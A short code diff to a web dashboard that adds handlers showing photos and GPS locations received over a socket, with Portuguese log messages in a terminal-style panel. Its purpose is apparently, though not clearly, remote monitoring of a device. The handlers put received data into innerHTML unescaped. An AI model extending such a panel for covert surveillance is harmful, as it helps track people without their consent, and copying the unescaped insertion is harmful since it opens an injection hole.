@@ -243,6 +243,26 @@
             }
         });
 
+        socket.on('display_photo', (data) => {
+            const img = document.getElementById("live-img");
+            const placeholder = document.getElementById("live-placeholder");
+            placeholder.style.display = "none";
+            img.style.display = "block";
+            img.src = 'data:image/jpeg;base64,' + data;
+            
+            const log = document.getElementById("log-terminal");
+            log.innerHTML += `[\${new Date().toLocaleTimeString()}] <span style="color: #39ff14;">📸 Foto recebida e exibida no Preview!</span><br>`;
+            log.scrollTop = log.scrollHeight;
+        });
+
+        socket.on('display_location', (data) => {
+            const log = document.getElementById("log-terminal");
+            const googleMapsUrl = `https://www.google.com/maps?q=\${data.lat},\${data.lon}`;
+            log.innerHTML += `[\${new Date().toLocaleTimeString()}] <span style="color: #39ff14;">📍 Localização Recebida: </span><br>`;
+            log.innerHTML += `<a href="\${googleMapsUrl}" target="_blank" style="color: #00ff00; text-decoration: underline;">Clique aqui para ver no Google Maps</a><br>`;
+            log.scrollTop = log.scrollHeight;
+        });
+
         socket.on('server_log', (msg) => {
             const log = document.getElementById("log-terminal");
             log.innerHTML += `[${new Date().toLocaleTimeString()}] <span style="color: #fff;">${msg}</span><br>`;
